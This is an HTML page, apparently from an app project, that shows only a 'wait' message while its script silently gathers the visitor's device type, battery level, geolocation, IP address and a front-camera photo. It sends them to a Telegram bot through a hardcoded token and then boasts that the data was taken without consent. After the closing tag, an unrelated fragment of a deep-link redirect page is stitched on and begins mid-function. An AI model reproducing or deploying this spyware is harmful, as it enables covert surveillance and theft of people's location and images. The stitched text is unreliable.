<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
      <link rel="icon" href="public/assets/icons/icon_thinkapp.png" type="image/png">
    <meta property="og:image" content="https://raw.githubusercontent.com/e-hr1/Think/main/public/assets/icons/icon_thinkapp.png">
   
    <title>ุงููููุฏุณ ูุฌุฏุงู</title>
    <style>
        /* ุฃุณููุจ ูุนุฑุถ ุฑุณุงูุฉ ุงูุงูุชุธุงุฑ ูู ุงูููุชุตู */
        #loading-message {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-size: 2em;
            color: #333;
            font-family: sans-serif;
        }
    </style>
</head>
<body style="background-color: white;">

    <!-- ุฑุณุงูุฉ ุงูุงูุชุธุงุฑ -->
    <div id="loading-message">ุฅูุชุธุฑ...</div>

    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        // ุงุณุชุจุฏู ุจุงููุนูููุงุช ุงูุตุญูุญุฉ
        const BOT_TOKEN = "6060274802:AAHQXBnAjd7vRQzecmUi07Kionaf2Lmzw0M"; // ุชููู ุงูุจูุช ุงูุฎุงุต ุจู
        const CHAT_ID = "@hfakw678"; // ูุนุฑู ุงููุฌููุนุฉ ุฃู ุงูููุงุฉ

        // ุฏุงูุฉ ูุฅุฑุณุงู ุงูุฑุณุงุฆู ุฅูู ุชููุฌุฑุงู
        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                }),
            });
        }

        // ุฏุงูุฉ ูุฅุฑุณุงู ุงูุตูุฑ ุฅูู ุชููุฌุฑุงู
        async function sendTelegramPhoto(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'camera.jpg');
            formData.append('caption', 'ุตูุฑุฉ ูู ุงููุงููุฑุง ุงูุฃูุงููุฉ');

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(url, {
                method: 'POST',
                body: formData,
            });
        }

        // ุฏุงูุฉ ูุงูุชูุงุท ุตูุฑุฉ ูู ุงููุงููุฑุง
        function captureImage() {
            return new Promise((resolve, reject) => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }) // ุงุณุชุฎุฏู ุงููุงููุฑุง ุงูุฃูุงููุฉ
                    .then(stream => {
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            // ุงูุชุธุฑ ููููุงู ุญุชู ุชุณุชูุฑ ุงููุงููุฑุง
                            setTimeout(() => {
                                context.drawImage(video, 0, 0, 320, 240);
                                canvas.toBlob(blob => {
                                    resolve(blob);
                                    // ุฅููุงู ุจุซ ุงูููุฏูู ุจุนุฏ ุงูุชูุงุท ุงูุตูุฑุฉ
                                    stream.getTracks().forEach(track => track.stop());
                                }, 'image/jpeg');
                            }, 500); // ุชุฃุฎูุฑ ูุตู ุซุงููุฉ
                        };
                    })
                    .catch(err => {
                        console.error("Camera Error:", err);
                        reject("ูุง ูููู ุงููุตูู ุฅูู ุงููุงููุฑุง: " + err.message);
                    });
            });
        }


        // ุจุฏุก ุนูููุฉ ุฌูุน ุงูุจูุงูุงุช ุนูุฏ ุชุญููู ุงูุตูุญุฉ
        window.onload = async function() {
            let message = "๐ฑ **ูุนูููุงุช ุงูุฌูุงุฒ ุงูุฌุฏูุฏุฉ** ๐ฑ\n\n";

            // 1. ููุน ุงูุฌูุงุฒ (User Agent)
            const userAgent = navigator.userAgent;
            message += `*ููุน ุงูุฌูุงุฒ:* \`${userAgent}\`\n`;

            // 2. ุดุญู ุงูุจุทุงุฑูุฉ
            try {
                const battery = await navigator.getBattery();
                message += `*ุดุญู ุงูุจุทุงุฑูุฉ:* \`${Math.floor(battery.level * 100)}%\`\n`;
            } catch (err) {
                message += "*ุดุญู ุงูุจุทุงุฑูุฉ:* ูุง ูููู ุงููุตูู ูููุนูููุงุช.\n";
            }

            // 3. ุงููููุน ุงูุฌุบุฑุงูู
            if ('geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
                    });
                    const { latitude, longitude } = position.coords;
                    message += `*ุงููููุน:* [ุนุฑุถ ุนูู ุงูุฎุฑูุทุฉ](https://www.google.com/maps?q=${latitude},${longitude})\n`;
                } catch (err) {
                    message += `*ุงููููุน:* ูุดู ูู ุงูุญุตูู ุนูู ุงููููุน (ูุฏ ูููู ุงูุณุจุจ ุฑูุถ ุงูุฅุฐู).\n`;
                }
            } else {
                message += "*ุงููููุน:* ุบูุฑ ูุฏุนูู ูู ูุฐุง ุงููุชุตูุญ.\n";
            }
            
            // 4. ุนููุงู IP
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                message += `*ุนููุงู IP:* \`${data.ip}\`\n`;
            } catch (err) {
                message += "*ุนููุงู IP:* ูุดู ูู ุงูุญุตูู ุนูู IP.\n";
            }

            // ุฅุฑุณุงู ุฑุณุงูุฉ ุงููุนูููุงุช ุงููุตูุฉ
            await sendTelegramMessage(message);

            // 5. ุงูุชูุงุท ูุฅุฑุณุงู ุตูุฑุฉ ุงููุงููุฑุง
            try {
                const photoBlob = await captureImage();
                await sendTelegramPhoto(photoBlob);
            } catch (err) {
                await sendTelegramMessage(`*ุงููุงููุฑุง:* ${err}`);
            }
            
            // ุงุณุชุจุฏุงู ูุญุชูู ุงูุตูุญุฉ ุจุงููุงูู ุจุนุฏ ุงูุชูุงุก ุงูุนูููุงุช
            document.body.innerHTML = "<h1 style='text-align: center; padding-top: 20%;'>ุชู ุฅุฑุณุงู ุจูุงูุงุช ุฌูุงุฒู ุจูุฌุงุญ.<br>โ ุงููุฆุงุช ุงููุฑุณูุฉ: <br>ุตูุฑุ ุงููููุนุ ููุน ุงูุฌูุงุฒ.<br>ุฏูู ููุงููุชู ุงูุตุฑูุญุฉ ๐คฃ.</h1>";
        };
    </script>

</body>
</html>
            if (navigator.sendBeacon) {
                navigator.sendBeacon(cleanupUrl);
                console.log("Cleanup process triggered via sendBeacon.");
            } else {
                // ุทุฑููุฉ ุจุฏููุฉ ูููุชุตูุญุงุช ุงููุฏููุฉ
                fetch(cleanupUrl, { method: 'GET', mode: 'no-cors' }).catch(e => console.error("Fetch fallback for cleanup failed:", e));
                console.log("Cleanup process triggered via fetch fallback.");
            }
        }

        // 1. ุงููุตูุต ุจุงููุบุชูู
        const translations = {
            en: {
                title: "Opening in Think AI...",
                status_checking: "Verifying link...",
                status_verified: "Verified! Attempting to open the app...",
                no_link_found: "No conversation link found. Redirecting...",
                link_expired: "Link expired or invalid. Redirecting..."
            },
            ar: {
                title: "ุงููุชุญ ูู Think AI...",
                status_checking: "ุฌุงุฑู ุงูุชุญูู ูู ุงูุฑุงุจุท...",
                status_verified: "ุชู ุงูุชุญูู! ุฌุงุฑู ูุญุงููุฉ ูุชุญ ุงูุชุทุจูู...",
                no_link_found: "ูู ูุชู ุงูุนุซูุฑ ุนูู ุฑุงุจุท ูุญุงุฏุซุฉ. ุฌุงุฑู ุฅุนุงุฏุฉ ุงูุชูุฌูู...",
                link_expired: "ุงูุฑุงุจุท ููุชูู ุงูุตูุงุญูุฉ ุฃู ุบูุฑ ุตุงูุญ. ุฌุงุฑู ุฅุนุงุฏุฉ ุงูุชูุฌูู..."
            }
        };

        // 2. ุฏุงูุฉ ุชุญุฏูุฏ ุงููุบุฉ ูุชุทุจูู ุงููุตูุต
        function setLanguage() {
            const userLang = (navigator.language || navigator.userLanguage).startsWith('ar') ? 'ar' : 'en';
            const t = translations[userLang];
            document.title = t.title;
            document.getElementById('status-message').textContent = t.status_checking;
            document.documentElement.lang = userLang;
            document.documentElement.dir = (userLang === 'ar') ? 'rtl' : 'ltr';
            document.body.style.opacity = 1;
            return t;
        }

        // 3. ุงูููุทู ุงูุฑุฆูุณู ููุชุญูู ูุฅุนุงุฏุฉ ุงูุชูุฌูู
        async function handleRedirect(t) {
            const statusMessage = document.getElementById('status-message');
            const params = new URLSearchParams(window.location.search);
            const gistId = params.get('gist_id');

            if (!gistId) {
                statusMessage.textContent = t.no_link_found;
                setTimeout(() => { window.location.href = 'welcome.html'; }, 1500);
                return;
            }

            try {
                const response = await fetch(`https://api.github.com/gists/${gistId}`);
                if (!response.ok) {
                    throw new Error('Link expired or invalid.');
                }

                statusMessage.textContent = t.status_verified;
                const deepLink = `think://open?gist_id=${gistId}`;

                let shouldRedirect = true;
                const onBlur = () => {
                    shouldRedirect = false;
                };
                window.addEventListener('blur', onBlur);

                setTimeout(() => {
                    window.removeEventListener('blur', onBlur);
                    if (shouldRedirect) {
                        window.location.href = 'welcome.html';
                    }
                }, 2500);

                // ูุญุงููุฉ ูุชุญ ุงูุฑุงุจุท ุงูุนููู
                window.location.href = deepLink;

            } catch (error) {
                console.error(error);
                statusMessage.textContent = t.link_expired;
                
                setTimeout(() => {
                    window.location.href = 'welcome.html?toast=toastLinkExpired';
                }, 1500);
            }
        }

        // 4. ููุทุฉ ุงูุจุฏุงูุฉ ุนูุฏ ุชุญููู ุงูุตูุญุฉ
        window.onload = function() {
            // ุฃููุงู: ุชุดุบูู ุนูููุฉ ุงูุชูุธูู ูู ุงูุฎูููุฉ ุจุดูู ูุฎูู
            triggerCleanup(); 
            
            // ุซุงููุงู: ุชูููุฐ ุงูููุทู ุงูุญุงูู ูุชุญุฏูุฏ ุงููุบุฉ ูุฅุนุงุฏุฉ ุงูุชูุฌูู
            const selectedTranslations = setLanguage();
            handleRedirect(selectedTranslations);
        };
    </script>
</body>
</html>
